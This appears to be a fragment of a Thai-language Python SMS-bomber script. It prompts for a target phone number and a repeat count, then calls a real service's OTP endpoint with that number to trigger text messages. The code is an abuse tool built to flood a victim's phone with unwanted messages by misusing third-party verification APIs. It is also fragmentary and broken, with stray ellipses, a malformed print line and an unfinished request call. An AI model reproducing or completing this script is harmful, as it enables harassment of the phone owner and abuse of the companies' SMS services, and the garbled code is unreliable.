...
print("จ")0
phone = input("     [+]ใส่เบอร์ที่ต้องการส่งSMS: ")
amount = int(input("     [+]จำวนวนครั้ง(1ครั้งเท่ากับ10+sms): "))
...
def cang39():
    var = requests.get("https://m.redbus.id/api/getOtp?number=" + phone[1:] + "&cc=66&whatsAppOpted=true",
